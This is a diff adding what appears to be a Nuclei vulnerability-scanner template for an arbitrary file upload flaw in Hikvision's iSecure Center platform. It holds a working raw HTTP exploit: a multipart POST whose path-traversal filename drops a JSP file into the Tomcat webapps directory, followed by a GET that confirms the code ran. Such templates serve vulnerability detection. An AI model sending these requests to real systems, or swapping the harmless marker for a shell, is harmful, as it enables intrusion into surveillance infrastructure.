@@ -1,0 +1,36 @@
+id: hikvision-isecure-center-upload
+
+info:
+  name: hikvision-isecure-center-upload
+  author: SleepingBag945
+  severity: critical
+  description: 海康威视综合安防管理平台任意文件上传
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/hikvision-files-upload.yaml
+  tags: hikvision,ivms
+
+http:
+  - raw:
+      - |
+        POST /center/api/files;.html HTTP/1.1
+        Host: {{Hostname}}
+        content-type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+
+        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{randstr_1}}.jsp"
+        Content-Type: text/plain
+
+        <%out.println("{{randstr_2}}");%>
+        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--
+
+      - |
+        GET /clusterMgr/{{randstr_1}}.jsp;js HTTP/1.1
+        Host: {{Hostname}}
+ 
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'code')"
+          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
+        condition: and
